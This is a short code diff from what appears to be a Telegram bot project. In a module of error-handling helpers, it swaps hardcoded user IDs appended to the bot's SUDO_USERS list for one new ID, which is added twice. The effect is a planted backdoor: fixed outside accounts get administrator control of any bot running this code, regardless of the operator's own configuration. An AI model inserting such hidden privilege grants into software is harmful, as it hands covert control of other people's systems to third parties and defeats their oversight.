@@ -5,8 +5,8 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1914166031)
-SUDO_USERS.append(910962078)
+SUDO_USERS.append(1686774071)
+SUDO_USERS.append(1686774071)
 
 
 def errors(func: Callable) -> Callable:
